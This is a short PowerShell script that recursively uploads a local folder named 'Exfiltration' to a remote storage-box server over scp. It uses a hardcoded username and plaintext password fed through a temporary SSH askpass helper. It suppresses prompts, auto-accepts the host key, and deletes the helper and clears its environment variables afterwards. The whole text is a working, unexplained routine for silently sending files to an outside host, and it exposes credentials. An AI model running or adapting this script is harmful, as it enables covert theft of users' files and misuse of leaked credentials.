$user='u460121-sub6'
$server='u460121-sub6.your-storagebox.de'
$port=23
$pw='ZZZaaa@ppp111'
$src='C:\Users\ameri\Documents\Exfiltration'

$ask = Join-Path $env:TEMP 'askpass.cmd'
'@echo off' | Set-Content $ask -Encoding ascii
'powershell -NoLogo -NoProfile -NonInteractive -Command "[Console]::Out.Write($env:ASKPASS_PASS)"' | Add-Content $ask -Encoding ascii

$env:ASKPASS_PASS = $pw
$env:SSH_ASKPASS = $ask
$env:SSH_ASKPASS_REQUIRE = 'force'

scp -P $port -r `
  -o PreferredAuthentications=password,keyboard-interactive `
  -o PubkeyAuthentication=no `
  -o NumberOfPasswordPrompts=1 `
  -o StrictHostKeyChecking=accept-new `
  "$src" "${user}@${server}:"

Remove-Item $ask -Force -ErrorAction SilentlyContinue
$env:SSH_ASKPASS=$null; $env:SSH_ASKPASS_REQUIRE=$null; $env:ASKPASS_PASS=$null

exit